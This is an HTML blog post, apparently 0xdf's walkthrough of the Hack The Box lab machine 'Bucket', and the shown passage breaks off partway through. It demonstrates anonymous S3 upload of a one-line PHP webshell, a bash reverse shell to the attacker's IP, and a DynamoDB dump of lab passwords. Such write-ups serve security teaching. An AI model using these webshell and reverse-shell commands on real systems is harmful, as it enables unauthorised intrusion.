@@ -1,0 +1,848 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" data-toc-skip="" itemprop="name headline">HTB: Bucket</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-bucket">htb-bucket</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#s3">s3</a> <a class="post-tag" href="/tags#aws">aws</a> <a class="post-tag" href="/tags#awscli">awscli</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#vhosts">vhosts</a> <a class="post-tag" href="/tags#wfuzz">wfuzz</a> <a class="post-tag" href="/tags#upload">upload</a> <a class="post-tag" href="/tags#webshell">webshell</a> <a class="post-tag" href="/tags#php">php</a> <a class="post-tag" href="/tags#credentials">credentials</a> <a class="post-tag" href="/tags#password-reuse">password-reuse</a> <a class="post-tag" href="/tags#dynamodb">dynamodb</a> <a class="post-tag" href="/tags#tunnel">tunnel</a> <a class="post-tag" href="/tags#localstack">localstack</a> <a class="post-tag" href="/tags#pd4ml">pd4ml</a> <a class="post-tag" href="/tags#pdfdetach">pdfdetach</a> <a class="post-tag" href="/tags#getfacl">getfacl</a> <a class="post-tag" href="/tags#facl">facl</a> </span><br/><br/>
+<time class="dt-published" datetime="2021-04-24T13:45:00+00:00" itemprop="datePublished">Apr 24, 2021
+    </time>
+</p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<ul class="nav navbar-nav"><li><a href="/2021/04/24/htb-bucket.html" style="color: #e6e6e6;">HTB: Bucket</a>
+<nav data-toggle="toc" id="toc"></nav></li><li><a href="/2021/05/03/more-bucket-beyond-root.html" style="color: #e6e6e6;">More Beyond Root</a></li>
+</ul>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/bucket-cover.webp" type="image/webp"/>
+<img alt="Bucket" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/bucket-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>Bucket is a pentest against an Amazon AWS stack. There’s an S3 bucket that is being used to host a website and is configured to allow unauthenticated read / write. I’ll upload a webshell to get a foothold on the box. From there, I’ll access the DynamoDB instance to find some passwords, one of which is reused for the user on the box. There’s another webserver on localhost with a in-development service that creates a PDF based on entries in the database. I’ll exploit that to get file read on the system as root, and turn that into a root shell. In Beyond Root, I’ll look at some of the configuration that allowed the box to simulate AWS inside HTB.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/283 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/bucket" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Bucket</a> <a href="https://hackthebox.com/machines/bucket" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-bucket.webp" type="image/webp"/> <img alt="Bucket" class="img-av" src="/icons/box-bucket.png"/></picture></a><br/><a href="https://hackthebox.com/machines/bucket" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1342455310812852227">17 Oct 2020</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">24 Apr 2021</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Medium">Medium [30]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/bucket-diff.webp" type="image/webp"/><img alt="Rated difficulty for Bucket" src="/img/bucket-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/bucket-radar.webp" type="image/webp"/><img alt="Radar chart for Bucket" src="/img/bucket-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">00:41:20</span><a href="https://app.hackthebox.com/users/139466" rel="noopener" target="_blank"><img alt="szymex73" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/139466" style="display: unset"/><span class="user-text" style="display: none"> szymex73</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">01:20:22</span><a href="https://app.hackthebox.com/users/139466" rel="noopener" target="_blank"><img alt="szymex73" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/139466" style="display: unset"/><span class="user-text" style="display: none"> szymex73</span></a><br/></td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/13531" rel="noopener" target="_blank"><img alt="MrR3boot" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/13531" style="display: unset"/><span class="user-text" style="display: none"> MrR3boot</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> found two open TCP ports, SSH (22) and HTTP (80):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.10.212
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-01 20:43 EST
+Nmap scan report for 10.10.10.212
+Host is up (0.019s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds
+</span><span class="gp">root@kali#</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.10.212
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-01 20:43 EST
+Nmap scan report for 10.10.10.212
+Host is up (0.015s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://bucket.htb/
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.46 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH</a> and <a href="https://packages.ubuntu.com/search?keywords=apache2">Apache</a> versions, the host is likely running Ubuntu Focal 20.04.</p>
+<p>The webserver on TCP 80 is returning a redirect to <code class="language-plaintext highlighter-rouge">http://bucket.htb</code>. I’ll want to fuzz for virtual hosts.</p>
+<h3 id="buckethtb---tcp-80">bucket.htb - TCP 80</h3>
+<p>Visiting <code class="language-plaintext highlighter-rouge">http://10.10.10.212</code> returns an HTTP 302 redirect to <code class="language-plaintext highlighter-rouge">http://bucket.htb</code>. After updating <code class="language-plaintext highlighter-rouge">/etc/hosts</code>, the page loads a site for the Bucket Advertising Platform:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210201204752931.webp" type="image/webp"/>
+<img alt="image-20210201204752931" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210201204752931.png"/>
+</picture>
+<p>Looking at the page source, the images are loaded from <code class="language-plaintext highlighter-rouge">s3.bucket.htb</code>, for example:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"http://s3.bucket.htb/adserver/images/bug.jpg"</span> <span class="na">alt=</span><span class="s">"Bug"</span> <span class="na">height=</span><span class="s">"160"</span> <span class="na">width=</span><span class="s">"160"</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+<p>After updating my <code class="language-plaintext highlighter-rouge">hosts</code> file again, now the images load:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210201205443352.webp" type="image/webp"/>
+<img alt="image-20210201205443352" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210201205443352.png"/>
+</picture>
+<p>There’s not much else here. The response headers don’t reveal much. <code class="language-plaintext highlighter-rouge">index.php</code> doesn’t exist, but rather the main page is <code class="language-plaintext highlighter-rouge">index.html</code>. There’s an email address, <code class="language-plaintext highlighter-rouge">support@bucket.htb</code>.</p>
+<p>I ran <code class="language-plaintext highlighter-rouge">gobuster</code>, but didn’t find anything.</p>
+<h3 id="subdomain-fuzz">Subdomain Fuzz</h3>
+<p>Given the use of different virtual hosts (vhosts), I used <code class="language-plaintext highlighter-rouge">wfuzz</code> to look for others:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>wfuzz <span class="nt">-c</span> <span class="nt">-u</span> http://10.10.10.212 <span class="nt">-H</span> <span class="s2">"Host: FUZZ.bucket.htb"</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">--hw</span> 26
+<span class="go">********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.212/
+Total requests: 19983
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000247:   404        0 L      2 W        21 Ch       "s3"
+000009543:   400        12 L     53 W       422 Ch      "#www"
+000010595:   400        12 L     53 W       422 Ch      "#mail"
+
+Total time: 0
+Processed Requests: 19983
+Filtered Requests: 19980
+Requests/sec.: 0
+</span></code></pre></div></div>
+<p>The two starting with <code class="language-plaintext highlighter-rouge">#</code> likely error out due to the <code class="language-plaintext highlighter-rouge">#</code>, and I already knew about <code class="language-plaintext highlighter-rouge">s3</code>.</p>
+<h3 id="s3buckethtb">s3.bucket.htb</h3>
+<h4 id="site">Site</h4>
+<p>I noticed above that the <code class="language-plaintext highlighter-rouge">s3.bucket.htb</code> domain returned a 404 status code in the fuzz above. In the browser, it just shows JSON about the status:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210201210151933.webp" type="image/webp"/>
+<img alt="image-20210201210151933" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210201210151933.png"/>
+</picture>
+<p>In Burp, the full response is:</p>
+<div class="language-http wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">404</span> 
+<span class="na">Date</span><span class="p">:</span> <span class="s">Tue, 02 Feb 2021 02:03:20 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">hypercorn-h11</span>
+<span class="na">content-type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
+<span class="na">content-length</span><span class="p">:</span> <span class="s">21</span>
+<span class="na">access-control-allow-origin</span><span class="p">:</span> <span class="s">*</span>
+<span class="na">access-control-allow-methods</span><span class="p">:</span> <span class="s">HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH</span>
+<span class="na">access-control-allow-headers</span><span class="p">:</span> <span class="s">authorization,content-type,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging</span>
+<span class="na">access-control-expose-headers</span><span class="p">:</span> <span class="s">x-amz-version-id</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+
+{"status": "running"}
+</code></pre></div></div>
+<p>Googling for any of these headers with <code class="language-plaintext highlighter-rouge">amz</code> in them will return a bunch of Amazon AWS docs. Given the name of the machine, the subdomain name, and now these headers, it’s pretty clear this machine will have some focus on simulating Amazon Cloud services.</p>
+<h4 id="main-site-on-s3">Main Site on S3</h4>
+<p>Given that the images are hosted in this instance of S3, it seems likely that the site pages are as well. I can test this by trying to get <code class="language-plaintext highlighter-rouge">index.html</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">-s</span> http://s3.bucket.htb/adserver/index.html
+<span class="go">&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+&lt;meta charset="UTF-8"&gt;
+&lt;title&gt;&lt;/title&gt;
+&lt;style&gt;
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box
+...[snip]...
+</span></code></pre></div></div>
+<p>That matches the page.</p>
+<h3 id="aws-overview">AWS Overview</h3>
+<p>There’s a handful of AWS terms that are useful to understand here:</p>
+<ul>
+<li>Amazon Web Services (AWS) - Amazon’s suite of cloud services all go under the name AWS</li>
+<li>Simple Storage Service (S3) - This service is where customers can store objects, which are data, assign permissions to that data, and make it available over API and/or HTTP(S) calls. People use S3 for hosting websites, data backups, hosting data lakes, and many more things.</li>
+<li>bucket - An area of storage associated with an account. Each bucket will have a unique name that is used to access it. There was a challenge involving looking for a bucket with loose permissions in the <a href="/holidayhack2020/2">2020 Sans Holiday Hack</a>.</li>
+</ul>
+<p>I’ve already seen urls that fit the typical S3 format hosting the images on the webpage:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://s3.bucket.htb/adserver/images/bug.jpg
+</code></pre></div></div>
+<p>It’s common to see these urls as <code class="language-plaintext highlighter-rouge">http://s3.[host]/[bucket name]/[file]</code>.</p>
+<p>Interacting with a S3 bucket can be done over <code class="language-plaintext highlighter-rouge">curl</code>, but as the interactions get more complicated, it’s easier to use <code class="language-plaintext highlighter-rouge">aws</code> command line interface (<code class="language-plaintext highlighter-rouge">apt install awscli</code>). <code class="language-plaintext highlighter-rouge">aws help</code> will load a manual page for the client, including listing a large number of subcommands like <code class="language-plaintext highlighter-rouge">s3</code> which I’ll use heavily for Bucket. The <code class="language-plaintext highlighter-rouge">--endpoint-url</code> option will be important as I want to go to Bucket from HTB instead of to AWS S3.</p>
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+<h3 id="upload-to-bucket">Upload to Bucket</h3>
+<p>Depending on the permissions assigned to the bucket, I may or may not have to authenticate to upload to it.  <code class="language-plaintext highlighter-rouge">aws s3 help</code> provides another manual page, and at the very bottom is a list of subcommands. <code class="language-plaintext highlighter-rouge">ls</code> is interesting, but it fails:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>aws s3 <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="nb">ls</span>
+<span class="go">Unable to locate credentials. You can configure credentials by running "aws configure".
+</span></code></pre></div></div>
+<p>The typical case for S3 is that credentials are required to administer a bucket. Still, if the bucket is misconfigured (or configured to allow anonymous access), then those creds won’t be validated, so I’ll try adding some. It works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>aws configure
+<span class="go">AWS Access Key ID [None]: 0xdf
+AWS Secret Access Key [None]: 0xdf
+Default region name [None]: bucket
+Default output format [None]: 
+
+</span><span class="gp">root@kali#</span><span class="w"> </span>aws s3 <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="nb">ls</span>
+<span class="go">2021-02-02 06:36:03 adserver
+</span></code></pre></div></div>
+<p>There’s a single bucket on this server that I can access with those bogus creds. I can look inside it by providing an S3URI of the format <code class="language-plaintext highlighter-rouge">aws s3 ls s3://mybucket</code> (from <code class="language-plaintext highlighter-rouge">aws s3 ls help</code>).</p>
+<p>The bucket contains <code class="language-plaintext highlighter-rouge">index.html</code> and an <code class="language-plaintext highlighter-rouge">images</code> directory with the three images from the page:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>aws s3 <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="nb">ls </span>s3://adserver
+<span class="go">                           PRE images/
+2021-02-02 06:38:04       5344 index.html
+</span><span class="gp">root@kali#</span><span class="w"> </span>aws s3 <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="nb">ls </span>s3://adserver/images/
+<span class="go">2021-02-02 06:40:04      37840 bug.jpg
+2021-02-02 06:40:04      51485 cloud.png
+2021-02-02 06:40:04      16486 malware.png
+</span></code></pre></div></div>
+<p>Another command was <code class="language-plaintext highlighter-rouge">cp</code>. I’ll create a dummy file to upload, and use <code class="language-plaintext highlighter-rouge">cp</code> to upload it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"Test file"</span> <span class="o">&gt;</span> test.txt
+<span class="gp">root@kali#</span><span class="w"> </span>aws s3 <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="nb">cp </span>test.txt s3://adserver/0xdf.txt
+<span class="go">upload: ./test.txt to s3://adserver/0xdf.txt
+</span></code></pre></div></div>
+<p>It’s there, but it doesn’t return from the main url:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>aws s3 <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="nb">ls </span>s3://adserver/
+<span class="go">                           PRE images/
+2021-02-02 06:42:13         10 0xdf.txt
+2021-02-02 06:42:04       5344 index.html
+
+</span><span class="gp">root@kali#</span><span class="w"> </span>curl http://bucket.htb/0xdf.txt
+<span class="go">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.41 (Ubuntu) Server at bucket.htb Port 80&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+</span></code></pre></div></div>
+<p>I wonder if only <code class="language-plaintext highlighter-rouge">.html</code> pages are being hosted? I’ll upload the same file with a <code class="language-plaintext highlighter-rouge">.html</code> extension, and after a few seconds, the file is available via the main site:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>aws s3 <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="nb">cp </span>test.txt s3://adserver/0xdf.html
+<span class="go">upload: ./test.txt to s3://adserver/0xdf.html                     
+</span><span class="gp">root@kali#</span><span class="w"> </span>curl http://bucket.htb/0xdf.html
+<span class="go">Test file
+</span></code></pre></div></div>
+<p>It doesn’t host <code class="language-plaintext highlighter-rouge">.txt</code>, but it does host <code class="language-plaintext highlighter-rouge">.html</code>. What about <code class="language-plaintext highlighter-rouge">.php</code>?</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>aws s3 <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="nb">cp </span>test.txt s3://adserver/0xdf.php
+<span class="go">upload: ./test.txt to s3://adserver/0xdf.php                      
+</span><span class="gp">root@kali#</span><span class="w"> </span>curl http://bucket.htb/0xdf.php
+<span class="go">Test file
+</span></code></pre></div></div>
+<p>It does. That means it’s likely to execute PHP as well.</p>
+<h3 id="webshell-upload">Webshell Upload</h3>
+<p>I’ll upload a simple webshell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span><span class="nb">cat</span> /opt/shells/php/cmd.php
+<span class="go">&lt;?php system($_REQUEST["cmd"]); ?&gt;
+</span><span class="gp">root@kali#</span><span class="w"> </span>aws s3 <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="nb">cp</span> /opt/shells/php/cmd.php s3://adserver/
+<span class="go">upload: /opt/shells/php/cmd.php to s3://adserver/cmd.php
+</span></code></pre></div></div>
+<p>It takes a minute, but eventually it shows up and executes:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl http://bucket.htb/cmd.php?cmd<span class="o">=</span><span class="nb">id</span>
+<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></code></pre></div></div>
+<p>There’s clearly something also clearing out the bucket every minute or two, so if the webshell disappears, I’ll need to re-upload it.</p>
+<p>I’ll go deeper into that automation (how the script gets to Bucket) in <a href="/2021/05/03/more-bucket-beyond-root.html">More Beyond Root</a>.</p>
+<h3 id="shell">Shell</h3>
+<p>To go from webshell to shell, I’ll use the Bash reverse shell:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl http://bucket.htb/cmd.php <span class="nt">--data-urlencode</span> <span class="s2">"cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.14/443 0&gt;&amp;1'"</span>
+</code></pre></div></div>
+<p>At <code class="language-plaintext highlighter-rouge">nc</code>, the connection provides a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.212.
+Ncat: Connection from 10.10.10.212:47408.
+bash: cannot set terminal process group (922): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@bucket:/var/www/html$
+</span></code></pre></div></div>
+<p>I’ll upgrade to a full PTY:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@bucket:/var/www/html$</span><span class="w"> </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("bash")'</span>
+<span class="go">python3 -c 'import pty;pty.spawn("bash")'
+</span><span class="gp">www-data@bucket:/var/www/html$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">root@kali#</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span> <span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+            reset
+reset: unknown terminal type unknown
+Terminal type? screen
+</span><span class="gp">www-data@bucket:/var/www/html$</span><span class="w"> 
+</span></code></pre></div></div>
+<h2 id="shell-as-roy">Shell as roy</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="web">Web</h4>
+<p>The shell starts in <code class="language-plaintext highlighter-rouge">/var/www/html</code>, where there’s only <code class="language-plaintext highlighter-rouge">index.html</code>. I’ll upload the webshell again, and after a short wait, it shows up:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@bucket:/var/www/html$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">total 12
+-rw-r--r-- 1 root root   35 Feb  2 12:01 cmd.php
+-rw-r--r-- 1 root root 5344 Feb  2 12:01 index.html
+</span></code></pre></div></div>
+<p>It’s interesting that that file is owned by root. www-data does not have permission to write here.</p>
+<p>There’s another folder in <code class="language-plaintext highlighter-rouge">/var/www</code>, <code class="language-plaintext highlighter-rouge">bucket-app</code>. I don’t have permissions to access this either:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@bucket:/var/www$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">total 8
+drwxr-x---+ 4 root root 4096 Sep 23 10:56 bucket-app
+drwxr-xr-x  2 root root 4096 Feb  2 12:02 html
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">bucket-app</code> is owned by root, but there’s a plus at the end of the permissions string. That means it has extended permissions, or ACLs:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@bucket:/var/www$</span><span class="w"> </span>getfacl bucket-app/
+<span class="c"># file: bucket-app/
+# owner: root
+# group: root
+</span><span class="go">user::rwx
+user:roy:r-x
+group::r-x
+mask::r-x
+other::---
+</span></code></pre></div></div>
+<p>roy has access to this directory to read and execute.</p>
+<h4 id="home-dirs">Home Dirs</h4>
+<p>There’s only one directory in <code class="language-plaintext highlighter-rouge">/home</code>, for roy. I can’t read <code class="language-plaintext highlighter-rouge">user.txt</code> yet, but there’s also a <code class="language-plaintext highlighter-rouge">project</code> directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@bucket:/home/roy$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 28
+drwxr-xr-x 3 roy  roy  4096 Sep 24 03:16 .
+drwxr-xr-x 3 root root 4096 Sep 16 12:59 ..
+lrwxrwxrwx 1 roy  roy     9 Sep 16 12:59 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 roy  roy   220 Sep 16 12:59 .bash_logout
+-rw-r--r-- 1 roy  roy  3771 Sep 16 12:59 .bashrc
+-rw-r--r-- 1 roy  roy   807 Sep 16 12:59 .profile
+drwxr-xr-x 3 roy  roy  4096 Sep 24 03:16 project
+-r-------- 1 roy  roy    33 Jan 31 13:54 user.txt
+</span></code></pre></div></div>
+<p>It contains four files:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@bucket:/home/roy/project$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">composer.json  composer.lock  db.php  vendor
+</span></code></pre></div></div>
+<h3 id="database">Database</h3>
+<h4 id="via-awscli">Via awscli</h4>
+<p><code class="language-plaintext highlighter-rouge">db.php</code> contains connection information to <a href="https://aws.amazon.com/dynamodb/">DynamoDB</a>, which is AWS’ NoSQL database instance. The command line client for is happens to be <code class="language-plaintext highlighter-rouge">aws</code>, which is installed on Bucket. There’s a good list of subcommands in <code class="language-plaintext highlighter-rouge">aws dynamodb help</code>. <code class="language-plaintext highlighter-rouge">list-tables</code> seems like a good place to start.</p>
+<p>On Bucket, it complains about the config again:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@bucket:/home/roy/project$</span><span class="w"> </span>aws <span class="nt">--endpoint-url</span> http://127.0.0.1:4566 dynamodb list-tables
+<span class="go">You must specify a region. You can also configure your region by running "aws configure".
+</span></code></pre></div></div>
+<p>Unfortunately, I can’t save preferences here as www-data:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@bucket:/etc/apache2/sites-enabled$</span><span class="w"> </span>aws configure
+<span class="go">AWS Access Key ID [None]: 0xdf
+AWS Secret Access Key [None]: 0xdf
+Default region name [None]: bucket
+Default output format [None]: 
+
+[Errno 13] Permission denied: '/var/www/.aws'
+</span></code></pre></div></div>
+<p>However, I am able to connect from my host (I’ll dig into why a bit in <a href="#beyond-root">Beyond Root</a>):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>aws <span class="nt">--endpoint-url</span> http://s3.bucket.htb dynamodb list-tables
+<span class="go">{
+    "TableNames": [
+        "users"
+    ]
+}
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">scan</code> subcommand seems like the one to use to dump an entire table. The <code class="language-plaintext highlighter-rouge">users</code> table has three users with passwords:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>aws <span class="nt">--endpoint-url</span> http://s3.bucket.htb dynamodb scan <span class="nt">--table-name</span> <span class="nb">users</span>
+<span class="go">{
+    "Items": [
+        {
+            "password": {
+</span><span class="gp">                "S": "Management@#</span>1@#<span class="s2">"
+</span><span class="go">            },
+            "username": {
+                "S": "Mgmt"
+            }
+        },
+        {
+            "password": {
+                "S": "Welcome123!"
+            },
+            "username": {
+                "S": "Cloudadm"
+            }
+        },
+        {
+            "password": {
+                "S": "n2vM-&lt;_K_Q:.Aa2"
+            },
+            "username": {
+                "S": "Sysadm"
+            }
+        }
+    ],
+    "Count": 3,
+    "ScannedCount": 3,
+    "ConsumedCapacity": null
+}
+</span></code></pre></div></div>
+<h4 id="dynamodb-shell">DynamoDB Shell</h4>
+<p>AWS has this web front end for interacting with DynamoDB using Javascript, and since it seems that requests are passing through to that, it makes sense that that shell is also available at <code class="language-plaintext highlighter-rouge">http://s3.bucket.htb/shell/</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210422114620963.webp" type="image/webp"/>
+<img alt="image-20210422114620963" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210422114620963.png"/>
+</picture>
